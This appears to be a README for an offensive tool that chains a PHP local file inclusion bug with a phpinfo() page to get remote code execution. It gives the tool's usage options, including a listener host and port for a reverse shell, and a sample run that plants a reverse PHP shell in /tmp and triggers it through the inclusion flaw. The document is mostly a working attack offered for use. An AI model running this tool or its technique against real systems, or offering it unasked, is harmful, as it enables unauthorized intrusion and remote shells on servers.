# LFI to RCE via phpinfo()
Research from !(https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)

# Use case

- Found an LFI Vulnerability
- Any script that displays the output of the PHPInfo() function will do. In most cases this will be /phpinfo.php 


# Usage 

```
usage: phpinfolfi_rce.py [-h] -l LFI [-t THREADS] --lhost LHOST --lport LPORT
                         -i PHPINFO [--payload PTYPE] [-e REQEND] [-v VERBOSE]

RCE from LFI with PHPINFO assistance

optional arguments:
  -h, --help            show this help message and exit
  -l LFI, --lfi LFI     the url path of the LFI vuln, per example
                        "http://127.0.0.1:8080/lfi.php?file="
  -t THREADS, --threads THREADS
                        Threads number, set to 10 by default
  --lhost LHOST         The local ip to listen, for rev shell
  --lport LPORT         The local port to listen, for rev shell
  -i PHPINFO, --phpinfo PHPINFO
                        Define the url path of the "phpinfo" script. Per ex:
                        "http://host/phpinfo.php"
  --payload PTYPE       Set the type of payload to use. 1|2|3 By default
                        payload is set to 3
  -e REQEND, --end REQEND
                        Define any end of lfi request, per examlpe "%00" by
                        default the end request is empty
  -v VERBOSE, --verbose VERBOSE
                        Define verbose output. set to False by default
```


# POC

```
$ python phpinfolfi_rce.py -l "http://host/browse.php?file=" --lhost 127.0.0.1 --lport 9001  -t 12  -i "http://host:8080/phpinfo.php"

 ____   ____   ____   ____ _     _       _              _ 
|  _ \ / __ \ / /\ \ / ___| |__ / |____ | |_ ___   ___ | |
| |_) / / _` | |  | | |  _| '_ \| |_  / | __/ _ \ / _ \| |
|  _ < | (_| | |  | | |_| | | | | |/ /  | || (_) | (_) | |
|_| \_\ \__,_| |  | |\____|_| |_|_/___|  \__\___/ \___/|_|
       \____/ \_\/_/                                      

Find all scripts in: https://github.com/roughiz


LFI With PHPInfo() RCE script
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Spawning worker pool (12)...
  24 /  1000
Got it! Reverse php Shell created in /tmp/IVA1XpPtHGjS.php

Yep! The payload works great !

I will execute the reverse shell, requesting the url: http://host/browse.php?file=/tmp/IVA1XpPtHGjS.php

Verify your nc listenner 127.0.0.1:9001
Shuttin' down...

```

### Nota 

Install the pyfiglet python module like :

```
$ sudo pip install pyfiglet
```

